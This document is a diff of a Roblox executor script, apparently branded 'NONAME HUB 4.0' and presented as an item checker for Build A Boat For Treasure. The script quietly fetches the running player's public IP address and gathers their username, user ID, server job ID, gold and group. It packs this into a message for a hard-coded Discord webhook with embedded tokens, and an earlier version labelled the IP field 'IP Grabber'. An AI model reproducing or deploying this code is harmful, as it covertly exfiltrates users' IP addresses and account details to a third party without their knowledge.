@@ -1,33 +1,128 @@
-local Webhook = "https://discordapp.com/api/webhooks/1095608897101906011/KKGDiOdAVBHRtQNgQYMFFto2hqcFNmoHqp_9q7Efdt4m8E5eR74OQTkb1wpgt2H_gk7g"
-local VIP = game.VIPServerOwnerId ~= 1
-
+local Webhook = "https://discord.com/api/webhooks/1097548811053830175/Mso8HIlHPAf-nxAnUWvSP97XmqTPA4wgpCJ8aOoxFJD0Ui1f1NUCHbgM2LA9m-Kwpm7i"
 local plrname = game.Players.LocalPlayer.Name
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 Parent = game.Workspace
 local Day = game.Players.LocalPlayer.AccountAge
+local MaxPlr = game.Players.MaxPlayers
+local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local ExecuteR = identifyexecutor()
+local JobIDG = game.JobId
+local UserIDs = game.Players.LocalPlayer.UserId
+local DisPlayN = game.Players.LocalPlayer.DisplayName
+local player = game:GetService"Players".LocalPlayer
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+local GPID = game.PlaceId
+local executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+local players = game.Players:GetPlayers()
+local Gold = game:GetService("Players").LocalPlayer.Data.Gold.Value 
+
+local BuildingTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("BuildingTool")
+local DeleteTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("DeleteTool")
+local PaintingTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("PaintingTool")
+local BindTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("BindTool")
+local PropertiesTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("PropertiesTool")
+local ScalingTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("ScalingTool")
+local TrowelTool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("TrowelTool")
+
+local ss = BuildingTool,DeleteTool,PaintingTool,BindTool,PropertiesTool,ScalingTool,TrowelTool
+
+local Group = game:GetService("Players").LocalPlayer.GroupRoll.Value
+
+if game.VIPServerOwnerId ~= 0 then
+	local VIP = print("VIP server")
+elseif game.VIPServerId ~= "" then
+	local RES = print("Reserved server")
+else
+	local PUB = print("Public server") -- "public" includes "Friend only" places
+end
+
+local GGSA = VIP,RES,PUB
+
 local PlayerData =
 {
-       ["content"] = "@everyone **Someone Run The Script**",
+       ["username"] = "Check Build A Boat For Treasure Item.",
+       ["avatar_url"] = AvatarImage,
+       ["content"] = "@everyone **Build A Boat For Treasure Check Item All**",
        ["embeds"] = {
            {
-           ["title"] = "Name: "..plrname,
-           ["description"] = "**Execute is: **".. identifyexecutor(),
-           ["color"] = tonumber(0x00FF00),
-           ["fields"] = {
-               {
-                   ["name"] = "Check Private Server",
-                   ["value"] = VIP,
-                   ["inline"] = true
-                },
-           },
+           ["title"] = "NONAME HUB 4.0",
+           ["description"] = "**Check Players Item**",
+           ["color"] = tonumber(0x00ffff),
+           ["thumbnail"] = {
+            ["url"] = AvatarImage,
+        },
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = "**"..plrname.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Display Name",
+                ["value"] = "**"..DisPlayN.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Player ID",
+                ["value"] = "**["..UserIDs.."](" .. tostring("https://www.roblox.com/users/" .. UserIDs .. "/profile")..")**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Job Id",
+                ["value"] = "**"..JobIDG.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Gold/Money",
+                ["value"] = "**"..Gold.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Groups",
+                ["value"] = "**"..Group.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Place Id",
+                ["value"] = "**["..GPID.."](" .. tostring("https://www.roblox.com/games/".. GPID) .. ")**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Name",
+                ["value"] = "**"..GameName.."**",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Max Player",
+                ["value"] = "**"..#players.."**/" .. "**"..MaxPlr.."**",
+                ["inline"] = true
+            },
+        },
            ["type"] = "rich",
-           ["footer"] = { text = "IP Grabber: " ..ip};
+           ["author"] = {
+                   ["name"] = "Roblox Map";
+                   ["url"] = 'https://www.roblox.com/games/'..GPID,
+                        },
            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
         }
     }
 }
+
 
 local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
 
